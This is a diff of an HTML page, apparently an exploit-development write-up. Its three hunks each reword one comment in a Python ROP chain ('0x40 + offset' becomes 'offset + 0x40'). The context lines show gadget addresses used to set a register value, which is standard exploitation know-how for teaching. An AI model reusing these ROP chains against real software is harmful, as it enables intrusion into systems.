@@ -718,7 +718,7 @@ Evaluate expression: -2095791445 = 8314c2ab  </span>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># $ecx = 0x40</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # 0x40 + offset</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # offset + 0x40</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;  </span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
@@ -809,7 +809,7 @@ rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;
 # $ecx = 0x40</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # 0x40 + offset</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # offset + 0x40</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
@@ -985,7 +985,7 @@ binary_base</span><span class="o"> =</span><span class="no"> int</span><span cla
 rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # 0x40 + offset</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # offset + 0x40</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
